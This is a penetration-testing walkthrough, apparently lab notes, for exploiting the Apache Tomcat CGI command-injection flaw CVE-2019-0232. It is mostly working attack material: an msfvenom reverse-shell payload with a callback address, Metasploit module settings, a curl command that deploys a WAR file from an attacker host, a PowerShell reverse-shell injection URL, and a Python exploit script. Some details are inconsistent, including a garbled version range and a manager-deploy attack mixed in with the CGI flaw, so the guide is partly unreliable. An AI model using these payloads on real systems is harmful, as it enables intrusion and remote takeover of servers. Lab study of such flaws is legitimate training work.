# 🛰️ CVE-2019-0232 Tomcat CGI Command Injection

## 📄 Overview
CVE-2019-0232 is a critical vulnerability in Apache Tomcat that allows for remote command execution due to improper handling of URL-encoded arguments by the CGI servlet. This guide covers exploitation steps and techniques, including Meterpreter session establishment.

## 🔍 Prerequisites & Environment Setup
### 🚦 System Requirements
- Windows 10/Server 2016 or later with Java Runtime Environment (JRE)
- Tomcat version 9.0.0.M1 to 5.3 inclusive, or equivalent 8.5.x/7.0.x versions

### 🔒 Target Configuration
```plaintext
+------------------------+
| Apache Tomcat          |
| - Version: 9.0.12      |
| - CGI Servlet Enabled  |
| - enableCmdLineArguments=true   |
+------------------------+
```

## 🚀 Exploitation Workflow

### Step 1: Service Discovery & Enumeration
```bash
# Nmap scan to identify services and vulnerabilities
nmap -sC -Pn TARGET_IP --open
```

### Step 2: Identifying Vulnerable CGI Scripts
```plaintext
+---------------------+
| /cgi/cmd.bat        |
+---------------------+
```

### Step 3: Crafting the Exploit

#### Payload Crafting
Use Metasploit's `msfvenom` to generate a Meterpreter reverse shell payload.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.45 LPORT=4444 -e generic/none -f war > /tmp/meterpreter.war
```

#### Exploit Execution
Use `msfconsole` for exploit setup and execution.
```bash
use exploit/windows/http/tomcat_mgr_deploy
set RHOSTS TARGET_IP
set PASSWORD tomcat
set WARFILE /tmp/meterpreter.war
exploit
```
Alternatively, use a URL-encoded payload:
```bash
curl -X POST http://TARGET_IP:8080/manager/deploy?path=/mexp&war=http://attacker-ip/meterpreter.war --data-urlencode "username=admin" --data-urlencode "password=<PASSWORD>"
```

### Step 4: Establishing a Meterpreter Session
```bash
# Start Metasploit console
msfconsole

# Load the exploit module
use exploit/windows/http/tomcat_mgr_deploy

# Set required options
set RHOSTS TARGET_IP
set WARFILE /tmp/meterpreter.war
set PASSWORD tomcat
exploit

# Verify shell establishment
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) >
```

### Step 5: Meterpreter Session Management
```bash
sysinfo
getuid
ps
pwd
```

### Step 6: Flag Retrieval
#### Method 1: Direct Meterpreter file access
```plaintext
cat C:/Users/Administrator/Desktop/flag.txt

# Expected output:
f55763d31a8f63ec935abd07aee5d3d0
```

#### Method 2: System shell access (alternative)
```bash
shell
type C:\Users\Administrator\Desktop\flag.txt
exit
```

## 🧪 Alternative Exploitation Methods

### Manual Command Injection (Educational)

Direct URL-based command injection:
```bash
curl "http://TARGET_IP:8080/cgi/cmd.bat?&dir"
```

Whoami execution:
```plaintext
curl "http://TARGET_IP:8080/cgi/cmd.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe"
```

PowerShell reverse shell (URL-encoded):
```plaintext
# Payload: powershell -e <base64_encoded_reverse_shell>
curl "http://TARGET_IP:8080/cgi/cmd.bat?&powershell+-e+<BASE64_PAYLOAD>"
```

### Python Exploit Script

```python
#!/usr/bin/env python3

import requests
import urllib.parse
import argparse

def exploit_cve_2019_0232(target_url, command):
    """
    CVE-2019-0232 Tomcat CGI Command Injection Exploit
    """
    # URL encode the command
    encoded_cmd = urllib.parse.quote(command, safe='')
    
    # Construct exploit URL
    exploit_url = f"{target_url}?&{encoded_cmd}"
    
    try:
        response = requests.get(exploit_url, timeout=10)
        
        if response.status_code == 200:
            print(f"[+] Command executed successfully:")
            print(response.text)
        else:
            print(f"[-] Exploit failed with status: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")

# Usage example:
# python3 cve_2019_0232.py -u http://target:8080/cgi/cmd.bat -c "c:\windows\system32\whoami.exe"
```

## 🧐 Technical Analysis

### Vulnerability Root Cause
```plaintext
- Windows JRE argument parsing flaw
- CGI servlet enableCmdLineArguments=true
- Query parameters passed as command arguments
- Special character filter bypass via URL encoding
- Command separator (&) enables injection
```

### Exploitation Requirements
```plaintext
✓ Windows operating system
✓ Tomcat version 9.0.0.M1 to 9.0.17 (or equivalent 8.5.x/7.0.x)
✓ CGI servlet enabled with enableCmdLineArguments=true
✓ Accessible .bat files in /cgi/ directory
✓ Network connectivity to target port (8080)
```

## 🏃‍♂️ HTB Academy Lab: CGI Command Injection

### Question:
"**After running the URL Encoded 'whoami' payload, what user is tomcat running as?**"

#### Step 1: Service Discovery
```bash
# Nmap scan identifies Tomcat
nmap -p- -sC -Pn TARGET --open
```

#### Step 2: CGI Script Discovery
```bash
# Fuzz for CGI scripts (.bat extension on Windows)
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://TARGET/cgi/FUZZ.bat

# Found: welcome.bat
# URL: http://TARGET/cgi/welcome.bat
```

#### Step 3: Command Injection Exploitation
```bash
http://TARGET/cgi/welcome.bat?&dir
http://TARGET/cgi/welcome.bat?&set
http://TARGET/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

**Key Technical Details:**
- **Command separator:** `&` allows command chaining
- **URL encoding required:** Bypasses Tomcat's special character filter
- **Full path needed:** PATH variable unset in CGI environment

**Expected Answer:** User running Tomcat service (typically `nt authority\system` or service account)

#### Attack Mechanism
1. **CGI Servlet** processes query parameters as command arguments.
2. **Input validation failure** allows command injection via `&`.
3. **URL encoding bypass** defeats special character filters.
4. **Arbitrary command execution** with Tomcat service privileges.

---

## 🛠 Next Steps

After mastering Tomcat exploitation:
1. [Jenkins Discovery & Attacks](jenkins-discovery-attacks.md)
2. [Java Deserialization Attacks](java-deserialization.md)
3. [Spring Boot Security Assessment](spring-boot-security.md)

### 💡 Key Takeaway
Tomcat exploitation represents one of the highest-impact attack vectors in enterprise environments, providing immediate remote code execution with frequent SYSTEM/root privileges. Master manager interface abuse, WAR file deployment, and JSP web shell techniques for reliable penetration testing success across internal and external assessments.

---

## 🔒 Professional Impact

Tomcat compromises often lead to complete domain takeover in Active Directory environments and critical data exposure in Linux server infrastructures, making these skills essential for advanced penetration testing.